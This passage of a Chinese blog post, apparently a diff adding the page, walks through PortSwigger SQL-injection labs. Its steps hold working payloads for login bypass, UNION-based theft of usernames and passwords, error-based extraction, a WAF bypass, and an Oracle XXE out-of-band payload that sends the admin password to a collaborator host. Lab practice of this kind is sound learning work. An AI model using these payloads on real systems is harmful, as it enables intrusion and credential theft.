+<p>可以通过 <code>SELECT</code> 语句调用这些函数，返回值即可判断数据库类型。</p>
+<h1 id="SQL注入的绕过"><a href="#SQL注入的绕过" class="headerlink" title="SQL注入的绕过"></a>SQL注入的绕过</h1><h1 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/l2Bt9jv-96HapqxYfeju2w?scene=25#wechat_redirect">https://mp.weixin.qq.com/s/l2Bt9jv-96HapqxYfeju2w?scene=25#wechat_redirect</a></p>
+<h1 id="SQL注入靶场"><a href="#SQL注入靶场" class="headerlink" title="SQL注入靶场"></a>SQL注入靶场</h1><h2 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h2><p>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data</a></p>
+<p>step:</p>
+<ol>
+<li>加单引号，发现异常     <img src="C:\Users\15191\AppData\Roaming\Typora\typora-user-images\image-20250309165506803.png" alt="image-20250309165506803" style="zoom: 67%;" /></li>
+<li>Gifts’ or 1&#x3D;1–+（因为 <code>1=1</code> 是一个恒真条件，导致整个 <code>WHERE</code> 条件永远为真。数据库不会过滤任何行，而是返回表中的所有数据。） </li>
+<li>Gifts’ or 1&#x3D;2–+ （如果 <code>id = 1</code> 为真，那么整个条件为真，该行会被选中。如果 <code>id = 1</code> 为假，那么由于 <code>1=2</code> 也为假，整个条件为假，该行不会被选中。最终，数据库只会返回 <code>id = 1</code> 的行。）</li>
+</ol>
+<h2 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h2><p>Lab:SQL injection vulnerability allowing login bypass</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">https://portswigger.net/web-security/sql-injection/lab-login-bypass</a></p>
+<p>step:</p>
+<ol>
+<li>账号administrator’– 密码随便输入（猜想where username&#x3D;’administrator’ and password&#x3D;’123456’ –+）</li>
+</ol>
+<h2 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h2><p>Lab: SQL injection attack, querying the database type and version on Oracle</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle</a></p>
+<p>step:</p>
+<ol>
+<li>Accessories’ or 1&#x3D;1–+，Accessories’ or 1&#x3D;2–+ 找到闭合</li>
+<li>Accessories’ order by 2–+，Accessories’ order by 3–+ 只有两个字段</li>
+<li>找到闭合确定了字段数，如何判断是什么数据库呢？见SQL注入利用篇</li>
+<li>‘ and 1&#x3D;1 UNION SELECT ‘a’,banner FROM v$version–+</li>
+</ol>
+<h2 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h2><p>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft</a></p>
+<p>step:</p>
+<ol>
+<li>Gifts’ or 1&#x3D;1–+，Gifts’ or 1&#x3D;2–+ 找到闭合</li>
+<li>order by 判断字段后  联合查询 Gifts’ union select 1,version()–+</li>
+</ol>
+<h2 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h2><p>Lab: SQL injection attack, listing the database contents on non-Oracle databases</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a></p>
+<p>step:</p>
+<ol>
+<li><p>闭合判断字段后，进行联合查询Gifts’ union select null,null–+</p>
+</li>
+<li><p>Gifts’ union select null,database()–+ 显示错误，尝试其它的数据库，Gifts’ union select null,current_database()–+，确定为psotgreSQL</p>
+</li>
+<li><p>Gifts’+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables– 找到users表</p>
+</li>
+<li><p>Gifts’+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name&#x3D;’users_imbvkh’– 查字段名 找到了username字段、password字段</p>
+</li>
+<li><p>Gifts’+UNION+SELECT+username_xltqyz,+password_wnxhyl+FROM+users_imbvkh–，然后登陆账号即可。</p>
+<p><code>information_schema.tables</code> 是 MySQL 和其他关系型数据库（如 PostgreSQL、SQL Server）中的一个系统视图，用于存储数据库中所有表的信息。可以自己在数据库中尝试查看该表的数据去了解该表。</p>
+</li>
+</ol>
+<h2 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h2><p>Lab: SQL injection attack, listing the database contents on Oracle</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle</a></p>
+<p>step:</p>
+<ol>
+<li>Pets’ or 1&#x3D;1– Pets’ or 1&#x3D;2– 找到闭合 order by 判断字段</li>
+<li>Pets’ union select null,null from dual–+ </li>
+<li>Pets’ and 1&#x3D;2 union select null,table_name from all_tables –  找到用户名表 USERS_ZDWAIY  </li>
+<li>Gifts’+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name&#x3D;’USERS_ZDWAIY’–     <strong>PASSWORD_TUKOGZ</strong> <strong>USERNAME_GHFJOM</strong> 找到列名</li>
+<li>Gifts’+UNION+SELECT+USERNAME_GHFJOM,+PASSWORD_TUKOGZ+FROM+USERS_ZDWAIY– 得到账号密码 并登录</li>
+</ol>
+<h2 id="Lab7"><a href="#Lab7" class="headerlink" title="Lab7"></a>Lab7</h2><p>Lab: SQL injection UNION attack, determining the number of columns returned by the query</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns</a></p>
+<p>step:</p>
+<ol>
+<li>找到闭合 order by判断字段数</li>
+<li>‘union select null,null,null–</li>
+</ol>
+<h2 id="Lab8"><a href="#Lab8" class="headerlink" title="Lab8"></a>Lab8</h2><p>Lab: SQL injection UNION attack, finding a column containing text</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text</a></p>
+<p>step:</p>
+<p>​	Pets’union select null,’giMbRU’,null–+</p>
+<h2 id="Lab9"><a href="#Lab9" class="headerlink" title="Lab9"></a>Lab9</h2><p>Lab: SQL injection UNION attack, retrieving data from other tables</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables</a></p>
+<p>step:</p>
+<ol>
+<li>Gifts’ union select username,password from users–+</li>
+</ol>
+<h2 id="Lab10"><a href="#Lab10" class="headerlink" title="Lab10"></a>Lab10</h2><p>Lab: SQL injection UNION attack, retrieving multiple values in a single column</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column</a></p>
+<p>step:</p>
+<ol>
+<li><p>找到闭合判断列数 </p>
+</li>
+<li><p>Tech+gifts’ union select null,concat(username,’~’,password) from users–+ 使用concat进行在一个字段中检索多个值。</p>
+<p>也可以使用字符串连接运算符 Tech+gifts’ UNION+SELECT+NULL,username||’~’||password+FROM+users–（<strong><code>||</code></strong>（双竖线）：用于连接字符串，在 PostgreSQL、Oracle、SQLite 以及部分 SQL 方言中有效。）</p>
+<p><strong>administrator~vkltzrpvfk54pvgozg2w</strong></p>
+</li>
+</ol>
+<h2 id="Lab11"><a href="#Lab11" class="headerlink" title="Lab11"></a>Lab11</h2><p>Lab: Blind SQL injection with conditional responses</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses</a></p>
+<p>step:</p>
+<ol>
+<li><p>TrackingId&#x3D;FDMzoanbTIDaYkYV’and 1&#x3D;1–; TrackingId&#x3D;FDMzoanbTIDaYkYV’and 1&#x3D;2–; </p>
+</li>
+<li><p>发现welcome back会消失</p>
+<img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/image-20250312163604376.png" style="zoom:50%;" />
+</li>
+<li><p>TrackingId&#x3D;FDMzoanbTIDaYkYV’ order by 1–;  并发现无法进行联合查询注入</p>
+</li>
+<li><p>利用子查询进行布尔注入</p>
+</li>
+</ol>
+<h2 id="Lab12"><a href="#Lab12" class="headerlink" title="Lab12"></a>Lab12</h2><p>Lab: Blind SQL injection with conditional errors</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors</a></p>
+<p>step:</p>
+<ol>
+<li>oracle盲注</li>
+</ol>
+<h2 id="Lab13"><a href="#Lab13" class="headerlink" title="Lab13"></a>Lab13</h2><p>Lab: Visible error-based SQL injection</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based">https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based</a></p>
+<p>step:</p>
+<ol>
+<li>‘ AND CAST((SELECT 1) AS int)–    CAST()<strong>数据类型转换</strong> 函数</li>
+<li>‘ AND 1&#x3D;CAST((SELECT 1) AS int)–</li>
+<li>‘ AND 1&#x3D;CAST((SELECT username FROM users) AS int)–</li>
+<li>‘AND 1&#x3D;CAST((SELECT username FROM users limit 1) AS int)–</li>
+</ol>
+<p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/image-20250312162338599.png" alt="image-20250312162338599"></p>
+<h2 id="Lab14"><a href="#Lab14" class="headerlink" title="Lab14"></a>Lab14</h2><p>Lab: Blind SQL injection with time delays</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">https://portswigger.net/web-security/sql-injection/blind/lab-time-delays</a></p>
+<h2 id="Lab15"><a href="#Lab15" class="headerlink" title="Lab15"></a>Lab15</h2><p>Lab: Blind SQL injection with time delays and information retrieval</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval</a></p>
+<h2 id="lab16"><a href="#lab16" class="headerlink" title="lab16"></a>lab16</h2><p>Lab: Blind SQL injection with out-of-band interaction</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band</a></p>
+<p>step:</p>
+<p>TrackingId&#x3D;x’+UNION+SELECT+EXTRACTVALUE(xmltype(‘&lt;%3fxml+version%3d”1.0”+encoding%3d”UTF-8”%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+”http%3a&#x2F;&#x2F;‘||(SELECT+password+FROM+users+WHERE+username%3d’administrator’)||’.BURP-COLLABORATOR-SUBDOMAIN&#x2F;“&gt;+%25remote%3b]&gt;’),’&#x2F;l’)+FROM+dual–</p>
+<p><strong>结合 SQL 注入 和 XXE</strong> 进行 OOB 数据泄露，适用于 <strong>Oracle 数据库</strong>。</p>
+<h2 id="Lab17"><a href="#Lab17" class="headerlink" title="Lab17"></a>Lab17</h2><p>Lab: Blind SQL injection with out-of-band data exfiltration</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration">https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration</a></p>
+<p>‘+UNION+SELECT+EXTRACTVALUE(xmltype(‘&lt;%3fxml+version%3d”1.0”+encoding%3d”UTF-8”%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+”http%3a&#x2F;&#x2F;‘||(SELECT+password+FROM+users+WHERE+username%3d’administrator’)||’.BURP-COLLABORATOR-SUBDOMAIN&#x2F;“&gt;+%25remote%3b]&gt;’),’&#x2F;l’)+FROM+dual–</p>
+<p><strong>结合 SQL 注入 和 XXE</strong> 进行 OOB 数据泄露，适用于 <strong>Oracle 数据库</strong>。发送http请求。</p>
+<h2 id="Lab18"><a href="#Lab18" class="headerlink" title="Lab18"></a>Lab18</h2><p>Lab: SQL injection with filter bypass via XML encoding</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding</a></p>
+<p>step1:</p>
+<ol>
+<li><storeId>1+1</storeId> 发现产生了响应</li>
+<li>进行or 1&#x3D;1 发现被waf拦截了 </li>
+<li>使用hackvertor进行encode  hex_entities编码进行bypass</li>
+<li>进行判断字段，最后得到密码 1 UNION SELECT username || ‘~’ || password FROM users</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">认识SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">一、什么是SQL注入？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">SQL是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">注入是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.3.</span> <span class="toc-text">SQL注入漏洞是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">二、SQL注入的经典案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.</span> <span class="toc-text">三、SQL注入的危害</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">SQL注入基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">一、SQL基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">二、如何检测SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9F%A5%E6%89%BE%E4%B8%8D%E5%90%8C%E4%BD%8D%E7%BD%AE%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">三、查找不同位置的SQL注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">发现SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">SQL注入的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E9%97%AD%E5%90%88%E7%A1%AE%E5%AE%9A%E4%BA%86%E5%AD%97%E6%AE%B5%E6%95%B0%EF%BC%8C%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%A2%EF%BC%9F"><span class="toc-number">4.2.</span> <span class="toc-text">找到闭合确定了字段数，如何判断是什么数据库呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%A7%82%E5%AF%9F%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">1. 观察报错信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E5%AE%9A%E8%AF%AD%E6%B3%95%E6%B5%8B%E8%AF%95"><span class="toc-number">4.2.2.</span> <span class="toc-text">2. 通过数据库特定语法测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-UNION-SELECT-%E8%AF%AD%E6%B3%95"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">基于 UNION SELECT 语法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A7%82%E5%AF%9F%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-number">4.2.3.</span> <span class="toc-text">3. 观察注释风格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87-ORDER-BY-%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.2.4.</span> <span class="toc-text">4. 通过 ORDER BY 测试数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%88%A9%E7%94%A8%E6%97%B6%E9%92%9F%E5%BB%B6%E8%BF%9F%E6%B5%8B%E8%AF%95%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">4.2.5.</span> <span class="toc-text">5. 利用时钟延迟测试（盲注）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%A7%82%E5%AF%9F%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8"><span class="toc-number">4.2.6.</span> <span class="toc-text">6. 观察默认数据库表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%A7%82%E5%AF%9F%E6%95%B0%E6%8D%AE%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.7.</span> <span class="toc-text">7. 观察数据函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">SQL注入的绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">SQL注入的防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA"><span class="toc-number">7.</span> <span class="toc-text">SQL注入靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab1"><span class="toc-number">7.1.</span> <span class="toc-text">Lab1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab2"><span class="toc-number">7.2.</span> <span class="toc-text">Lab2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab3"><span class="toc-number">7.3.</span> <span class="toc-text">Lab3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab4"><span class="toc-number">7.4.</span> <span class="toc-text">Lab4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab5"><span class="toc-number">7.5.</span> <span class="toc-text">Lab5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab6"><span class="toc-number">7.6.</span> <span class="toc-text">Lab6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab7"><span class="toc-number">7.7.</span> <span class="toc-text">Lab7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab8"><span class="toc-number">7.8.</span> <span class="toc-text">Lab8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab9"><span class="toc-number">7.9.</span> <span class="toc-text">Lab9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab10"><span class="toc-number">7.10.</span> <span class="toc-text">Lab10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab11"><span class="toc-number">7.11.</span> <span class="toc-text">Lab11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab12"><span class="toc-number">7.12.</span> <span class="toc-text">Lab12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab13"><span class="toc-number">7.13.</span> <span class="toc-text">Lab13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab14"><span class="toc-number">7.14.</span> <span class="toc-text">Lab14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab15"><span class="toc-number">7.15.</span> <span class="toc-text">Lab15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab16"><span class="toc-number">7.16.</span> <span class="toc-text">lab16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab17"><span class="toc-number">7.17.</span> <span class="toc-text">Lab17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab18"><span class="toc-number">7.18.</span> <span class="toc-text">Lab18</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&text=SQL注入由浅至深解析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&is_video=false&description=SQL注入由浅至深解析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入由浅至深解析&body=Check out this article: https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&name=SQL注入由浅至深解析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&t=SQL注入由浅至深解析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    M3ng9e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
